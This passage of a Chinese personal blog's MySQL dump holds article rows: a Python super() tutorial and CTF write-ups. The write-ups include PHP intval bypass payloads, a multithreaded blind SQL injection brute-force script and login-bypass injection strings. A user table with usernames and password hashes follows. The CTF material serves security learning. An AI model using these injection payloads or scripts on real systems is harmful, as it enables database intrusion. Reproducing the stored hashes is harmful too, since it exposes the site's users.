style="margin-left:10px;">光从字面来看，这可以算是python中最语焉不详的帮助文档之一了。甚至里面还有一些术语误用。那super究竟应该怎么用呢，我们重点来看super中的第1和第3种用法</p><h2><a></a>5.1. super(type, obj)</h2><p style="margin-left:10px;">当我们在Leaf的__init__中写这样的super时：</p><pre>class&nbsp;Leaf(Medium1,&nbsp;Medium2):def&nbsp;__init__(self):super(Leaf,&nbsp;self).__init__()print&nbsp;“Leaf&nbsp;init”</pre><p style="margin-left:10px;">super(Leaf, self).__init__()的意思是说：</p><ol class=" list-paddingleft-2"><li><p>获取self所属类的mro, 也就是[Leaf, Medium1, Medium2, Base]</p></li><li><p>从mro中Leaf右边的一个类开始，依次寻找__init__函数。这里是从Medium1开始寻找</p></li><li><p>一旦找到，就把找到的__init__函数绑定到self对象，并返回</p></li></ol><p style="margin-left:10px;">&nbsp;</p><p style="margin-left:10px;">从这个执行流程可以看到，如果我们不想调用Medium1的__init__，而想要调用Medium2的__init__，那么super应该写成：super(Medium1, self)__init__()&nbsp;</p><h2><a></a>5.2. super(type, type2)</h2><p style="margin-left:10px;">当我们在Leaf中写类方法的super时：</p><pre>class&nbsp;Leaf(Medium1,&nbsp;Medium2):def&nbsp;__new__(cls):obj&nbsp;=&nbsp;super(Leaf,&nbsp;cls).__new__(cls)print&nbsp;“Leaf&nbsp;new”return&nbsp;obj</pre><p style="margin-left:10px;">super(Leaf, cls).__new__(cls)的意思是说：</p><ol class=" list-paddingleft-2"><li><p>获取cls这个类的mro，这里也是[Leaf, Medium1, Medium2, Base]</p></li><li><p>从mro中Leaf右边的一个类开始，依次寻找__new__函数</p></li><li><p>一旦找到，就返回“<span style="color:#ff0000;">非绑定</span>”的__new__函数</p></li></ol><p style="margin-left:10px;">&nbsp;</p><p style="margin-left:10px;">由于返回的是非绑定的函数对象，因此调用时不能省略函数的第一个参数。这也是这里调用__new__时，需要传入参数cls的原因</p><p style="margin-left:10px;">同样的，如果我们想从某个mro的某个位置开始查找，只需要修改super的第一个参数就行</p><h1><a></a>6.&nbsp;&nbsp; 小结</h1><p style="margin-left:10px;">至此，我们讲解了和super相关的用法及原理，小结一下我们讲过的内容有：</p><ol class=" list-paddingleft-2"><li><p>python调用父类成员共有2种方法：普通方法，super方法</p></li><li><p>在钻石继承中，普通方法会遇到Base类两次初始化的问题</p></li><li><p>简述了其他语言对这个问题的解决方法，并用实例展示了python使用super可以解决此问题</p></li><li><p>在讲super具体用法前，先讲了super的内核：mro的知识和原理</p></li><li><p>讲解了super两种主要的用法及原理</p></li></ol><p><br/></p>', 'python', 0, 1, '2019-04-20', 56, -3, 0, '/upload/image/20190420/6411d248252ead6a278e3085515b1f44.jpg'),
	(112, '你真的会php吗', 'pinger', '<p>&nbsp;&nbsp;&nbsp;&nbsp;这题有两种方法：一，溢出。二，科学计数法（0x666=0）</p><p>&nbsp;&nbsp;&nbsp;&nbsp;得到hint不用讲。直接讲hint里的函数：</p><p>&nbsp;&nbsp;&nbsp;&nbsp;①foreach([$_POST] as $global_var)&nbsp;&nbsp;&nbsp;&nbsp;就是将post数据的键值对（比如：number:123）赋值为$global_var。foreach($global_var as $key =&gt; $value)&nbsp;&nbsp;&nbsp;&nbsp;这个就是将键值对的键和值分别赋值给key和value。$value = trim($value);&nbsp;&nbsp;&nbsp;&nbsp;这个函数的作用就是去掉value的两端的空白字符，所以你直接post一个number=123(空格)&nbsp;&nbsp;&nbsp; 是没用的，空格会被去除。is_string($value) &amp;&amp; $req[$key] = addslashes($value); 这条语句，首先看&amp;&amp;之前（如果&amp;&amp;之间的语句为false，后面的就不会执行了）的语句is_string($value)，就是判断post的number数据是否为字符串，后面的就是在value为字符串的前提下将value值addslashes()处理后存入req[$key]，此处的$key为number。addslashes()函数是将一些字符转义，一般用来防止sql注入，这里没用。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;②is_palindrome_number($number)&nbsp;&nbsp;&nbsp;&nbsp;这个函数读一下处理逻辑就知道是判断$number是否为回文数，是就返回false，否则为true。然后是一个if判断：if(is_numeric($_REQUEST[&#39;number&#39;]))&nbsp; 就是判断post的number值是否为数字，显然前面想将number的值存入req[$key]，number值就必须为字符串，这里也只有为字符串才不会进入这个if，从而结束。然后就是$req[&#39;number&#39;]!=strval(intval($req[&#39;number&#39;])这条语句了，这条语句意思是将number字符串(能够执行到这里说明number是字符串)先强转为int数字，然后再转为字符转要和原来的字符转相等。所以前面虽然知道number要为字符串，但是这个字符串也是要有要求的，像：123a，转为int为123，再转为字符串123，和字符串123a（原来的字符串）是不相等的，所以我们得想办法构造这样一个字符串，我想了半天好像不存在这样得字符串=-=后来看别人得wp，晓得可以将数字和一个%00或者%20拼接可以被认为是一个字符串，然是实际处理时%00和%20又被忽略.所以我构造字符串123%00，现在123%00经过$req[$key] = addslashes($value)后得到：$req[&#39;number&#39;]=&#39;123&#39;，现在字符串123转为int数字再转为字符串还是和字符串123相等，目的达成。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;③但是没有得到flag，应为还有一个要求：$value1 = intval($req[&quot;number&quot;]); $value2 = intval(strrev($req[&quot;number&quot;]));&nbsp; 其中value1和value2（value2就是将number反转得到得值再转为int数字）要相等，而且$req[&#39;number&#39;]不能为回文数，卧槽，这不是自相矛盾嘛？？其实这里主要时回文数判断函数is_palindrome_number($number)绕过，其实这是一个假的回文数判断函数，严格来讲，它只是判断字符串以中间为轴，两端对称得单个字符是否相当，相等就为回文数。所以我现在构造post数据：number=-0%00，-0反转再转为int数字还是为0，-0也是0，所以value1等于value2，并且，”-“不等于“0”（所以说那是一个假的回文数判断函数），于是可以得到flag。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;④但是还有一种nb的方法，看别人的wp才晓得，就是溢出，利用intval()函数的固定数值范围，假设现在这个函数的处理范围为-123~123，那么我输入123，反转得到321，但是intval(321)的最大范围为123，所以intval(321)就等于123，造成intval(123)=intval(321)的现象，而且123不是回文数。所以我们只需要输入一个等于边界的数字，再和%00拼接，就可以得到flag了<br/></p>', '**', 0, 1, '2019-04-21', 63, -2, 0, '/upload/image/20190421/9b493d6c65d242637357d6e274686ed5.jpg'),
	(113, '认真一点！(多线程)', 'pinger', '<p>&nbsp;&nbsp;&nbsp;&nbsp;实验吧的web题：认真一点；具体的解体思路就不给了，过滤其实不坑，坑的是flag你他妈也过滤？？？？？[手动黑人问号脸]</p><p>&nbsp;&nbsp;&nbsp;&nbsp;我已经写过一个python跑flag的脚本了，但是那个脚本运行实在是太慢了，于是写了个多线程的脚本，只需要不到三分钟（原来真的很慢很慢=-=）</p><p>&nbsp;&nbsp;&nbsp;&nbsp;参考代码如下：</p><p>import requests<br/>import threading<br/>import queue<br/>import time<br/><br/>#多线程类<br/>class MyThread(threading.Thread):<br/>&nbsp;&nbsp; &nbsp;def __init__(self,name,q,re):<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;super(MyThread,self).__init__()<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;self.name=name<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;self.q=q<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;self.re=re<br/>&nbsp;&nbsp; &nbsp;<br/>&nbsp;&nbsp; &nbsp;def run(self):<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;print(&quot;Starting:&quot;,self.name)<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;getFlag(self.name,self.q,self.re)<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;print(&quot;Exiting:&quot;,self.name)<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;<br/>#具体的爆破逻辑函数&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;<br/>def getFlag(n,q,re):<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;status=&quot;You are in&quot;<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;while True:<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;try:<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;urlInfo=q.get(timeout=2)<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;#print(urlInfo[&quot;content&quot;])<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;except Exception as e:<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;break<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;try:<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;r=requests.post(url,urlInfo[&quot;content&quot;],timeout=2)<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if status in r.text:<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&#39;&#39;&#39;<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;print(urlInfo[&quot;content&quot;])<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;print(r.text)<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&#39;&#39;&#39;<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;re.append(urlInfo[&quot;info&quot;])<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;except Exception as e:<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;continue<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;<br/>if __name__==&quot;__main__&quot;:<br/>&nbsp;&nbsp; &nbsp;<br/>&nbsp;&nbsp; &nbsp;#开始时间<br/>&nbsp;&nbsp; &nbsp;start=time.time()<br/><br/>&nbsp;&nbsp; &nbsp;#实验吧url<br/>&nbsp;&nbsp; &nbsp;url=&quot;http://ctf5.shiyanbar.com/web/earnest/index.php&quot;<br/>&nbsp;&nbsp; &nbsp;#post数据<br/>&nbsp;&nbsp; &nbsp;data={&quot;id&quot;:&quot;2&#39; or ascii(mid((select group_concat(fL$4G) from fiag) from {0} for 1))={1} or &#39;&quot;}<br/>&nbsp;&nbsp; &nbsp;data[&quot;id&quot;]=data[&quot;id&quot;].replace(&#39; &#39;,chr(0x0a)).replace(&#39;or&#39;,&#39;oR&#39;)<br/>&nbsp;&nbsp; &nbsp;<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;<br/>&nbsp;&nbsp; &nbsp;#创建post数据队列<br/>&nbsp;&nbsp; &nbsp;dataQueue=queue.Queue(500)<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;<br/>&nbsp;&nbsp; &nbsp;#创建接受结果的列表<br/>&nbsp;&nbsp; &nbsp;re=[]<br/>&nbsp;&nbsp; &nbsp;<br/>&nbsp;&nbsp; &nbsp;<br/>&nbsp;&nbsp; &nbsp;#创建线程池<br/>&nbsp;&nbsp; &nbsp;thread=[]<br/>&nbsp;&nbsp; &nbsp;threadNum=20<br/>&nbsp;&nbsp; &nbsp;for i in range(0,threadNum):<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;t=MyThread(i,dataQueue,re)<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;t.start()<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;#将启动的线程加入线程池<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;thread.append(t)<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;<br/>&nbsp;&nbsp; &nbsp;#post数据队列放入具体数据，此处是主线程执行放入，相当于主线程一边放入，分线程一边取出，节约时间&nbsp;&nbsp; &nbsp;<br/>&nbsp;&nbsp; &nbsp;for i in range(1,30):&nbsp;&nbsp; &nbsp;<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;for j in range(33,127):<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;tmp={}<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;tmp[&quot;content&quot;]={&quot;id&quot;:data[&quot;id&quot;].format(i,j)}<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;tmp[&quot;info&quot;]=str(i)+&quot;,&quot;+str(j)<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;dataQueue.put(tmp)<br/>&nbsp;&nbsp; &nbsp;&#39;&#39;&#39;&nbsp;&nbsp; &nbsp;<br/>&nbsp;&nbsp; &nbsp;tmp[&quot;content&quot;]={&quot;id&quot;:data[&quot;id&quot;].format(1,2)}<br/>&nbsp;&nbsp; &nbsp;tmp[&quot;info&quot;]=str(3)+&quot;,&quot;+str(4)<br/>&nbsp;&nbsp; &nbsp;print(&quot;.&quot;)<br/>&nbsp;&nbsp; &nbsp;dataQueue.put(tmp)<br/>&nbsp;&nbsp; &nbsp;&#39;&#39;&#39;&nbsp;&nbsp; &nbsp;<br/>&nbsp;&nbsp; &nbsp;for i in range(0,len(thread)):<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;thread[i].join()<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;<br/><br/>&nbsp;&nbsp; &nbsp;flag={}<br/>&nbsp;&nbsp; &nbsp;for i in re:<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;before=i.split(&quot;,&quot;)<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;before[0]=int(before[0])<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;before[1]=int(before[1])<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;flag[before[0]]=before[1]<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;<br/>&nbsp;&nbsp; &nbsp;#取得排序后的键<br/>&nbsp;&nbsp; &nbsp;keys=sorted(flag)<br/>&nbsp;&nbsp; &nbsp;info=&quot;&quot;<br/>&nbsp;&nbsp; &nbsp;for i in keys:<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;info+=chr(flag[i])<br/>&nbsp;&nbsp; &nbsp;print(&quot;flag为：&quot;,info)&nbsp;&nbsp; &nbsp;<br/>&nbsp;&nbsp; &nbsp;end=time.time()<br/>&nbsp;&nbsp; &nbsp;print(&quot;脚本运行时间为：&quot;,end-start)</p>', '实验吧', 1, 4, '2019-04-28', 63, -2, 0, '/upload/image/20190428/58ffecf977c14ebca9bb7c300776ed81.jpg'),
	(114, '登陆一下好吗？', 'pinger', '<p>&nbsp;&nbsp;&nbsp;&nbsp;打开是一个登陆页，想到绕过登陆。于是fuzz看看过滤了哪些关键词。经过测试，过滤了#和--和or和/和*</p><p>&nbsp;&nbsp;&nbsp;&nbsp;想到过滤了/*，于是不能用内联注释绕过，又过滤了or，一时没辙=-=</p><p>&nbsp;&nbsp;&nbsp;&nbsp;后来看了别人的wp，终于想起还有一个骚姿势~~，直接构造两个布尔表达式，比如：</p><p>&nbsp;&nbsp;&nbsp;&nbsp;select * from admin where username=&#39;&#39;=&#39;&#39; and password=&#39;&#39;=&#39;&#39;;</p><p>&nbsp;&nbsp;&nbsp;&nbsp;username=&#39;&#39;为假，假=&#39;&#39;，于是连个布尔表达式总的为真，后面的也是~~于是就绕过了~~~</p><p>&nbsp;&nbsp;&nbsp;&nbsp;虽然这题过滤了内联注释和or，但是还是提一下两种骚姿势（此处不能用）：</p><p>①用内联注释：select * from user where name=&#39;pinger&#39;/*&#39; and password=&#39;*/ and &#39;1&#39;=&#39;1&#39;;</p><p>②用转义符：select * from admin where username=&#39;admin\\&#39; and password=&#39; or &#39;1&#39;=&#39;1&#39;;</p>', 'wp', 0, 1, '2019-04-28', 63, -2, 0, '/upload/image/20190428/b40e65cf8e2a16d0640da33c56ef1f98.jpg');
/*!40000 ALTER TABLE `c_article` ENABLE KEYS */;

-- Dumping structure for table blog.c_category
CREATE TABLE IF NOT EXISTS `c_category` (
  `cid` tinyint(2) NOT NULL AUTO_INCREMENT,
  `cname` varchar(20) NOT NULL,
  `sort` tinyint(2) NOT NULL DEFAULT '0',
  `pid` tinyint(3) NOT NULL,
  PRIMARY KEY (`cid`),
  UNIQUE KEY `cname` (`cname`)
) ENGINE=InnoDB AUTO_INCREMENT=65 DEFAULT CHARSET=utf8;

-- Dumping data for table blog.c_category: ~11 rows (大约)
/*!40000 ALTER TABLE `c_category` DISABLE KEYS */;
INSERT INTO `c_category` (`cid`, `cname`, `sort`, `pid`) VALUES
	(54, 'sql-injection', 0, -2),
	(55, '手工注入', 0, 54),
	(56, '小知识点', 0, -3),
	(57, 'Java笔记', 0, -3),
	(58, 'sqlMap', 0, 54),
	(59, 'linux学习', 0, -3),
	(60, 'Nmap讲解', 0, -2),
	(61, 'Hydra', 0, -2),
	(62, '各种技巧', 0, -2),
	(63, '实验吧wp', 0, -2),
	(64, '前端', 0, -1);
/*!40000 ALTER TABLE `c_category` ENABLE KEYS */;

-- Dumping structure for table blog.c_comment
CREATE TABLE IF NOT EXISTS `c_comment` (
  `coid` int(11) NOT NULL AUTO_INCREMENT,
  `user` varchar(20) CHARACTER SET utf8 COLLATE utf8_bin DEFAULT NULL,
  `co_time` date DEFAULT NULL,
  `content` varchar(150) CHARACTER SET utf8 COLLATE utf8_bin DEFAULT NULL,
  `aid` int(11) DEFAULT NULL,
  `level` tinyint(1) DEFAULT NULL,
  `pid` int(11) DEFAULT NULL,
  PRIMARY KEY (`coid`)
) ENGINE=InnoDB AUTO_INCREMENT=25 DEFAULT CHARSET=utf8;

-- Dumping data for table blog.c_comment: ~2 rows (大约)
/*!40000 ALTER TABLE `c_comment` DISABLE KEYS */;
INSERT INTO `c_comment` (`coid`, `user`, `co_time`, `content`, `aid`, `level`, `pid`) VALUES
	(23, 'Aomaha', '2019-04-17', '0x7e就是符号~', 101, 0, 0),
	(24, 'Aomaha', '2019-04-20', '最后得到的flag为flag{hahayouwin!}，是错的，实际的flag含有空格和-关键词，但是这两个关键词被过滤，所以脚本得到的flag没有这两个字符，坑啊！！！算了，大概思路就是上面的，只不过这题的坑是真的多~~~不想搞了GIAO！', 110, 0, 0);
/*!40000 ALTER TABLE `c_comment` ENABLE KEYS */;

-- Dumping structure for table blog.c_notice
CREATE TABLE IF NOT EXISTS `c_notice` (
  `noid` int(11) NOT NULL AUTO_INCREMENT,
  `content` varchar(90) NOT NULL,
  `sort` int(11) NOT NULL,
  PRIMARY KEY (`noid`)
) ENGINE=InnoDB AUTO_INCREMENT=10 DEFAULT CHARSET=utf8;

-- Dumping data for table blog.c_notice: ~0 rows (大约)
/*!40000 ALTER TABLE `c_notice` DISABLE KEYS */;
INSERT INTO `c_notice` (`noid`, `content`, `sort`) VALUES
	(9, '闭关修炼...', 0);
/*!40000 ALTER TABLE `c_notice` ENABLE KEYS */;

-- Dumping structure for table blog.c_user
CREATE TABLE IF NOT EXISTS `c_user` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `name` varchar(20) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL,
  `password` varchar(50) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL,
  `is_admin` tinyint(1) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=14 DEFAULT CHARSET=utf8;

-- Dumping data for table blog.c_user: ~6 rows (大约)
/*!40000 ALTER TABLE `c_user` DISABLE KEYS */;
INSERT INTO `c_user` (`id`, `name`, `password`, `is_admin`) VALUES
	(1, 'Aomaha', '1507242715b049b815e6c31a645bded1', 1),
	(8, '家岐', '701dccb17489fe1037d45dfdc22a8e82', 0),
	(9, 'QQ去去去', '25d55ad283aa400af464c76d713c07ad', 0),
	(11, 'Cassie_std', 'ccb645149cfb3600f3dad581d9ed35dd', 1),
	(12, 'admin', '7fef6171469e80d32c0559f88b377245', 0),
	(13, 'mm', '0a03723d04160868a4cedc35054d1e3b', 0);
/*!40000 ALTER TABLE `c_user` ENABLE KEYS */;

/*!40101 SET SQL_MODE=IFNULL(@OLD_SQL_MODE, '') */;
/*!40014 SET FOREIGN_KEY_CHECKS=IF(@OLD_FOREIGN_KEY_CHECKS IS NULL, 1, @OLD_FOREIGN_KEY_CHECKS) */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
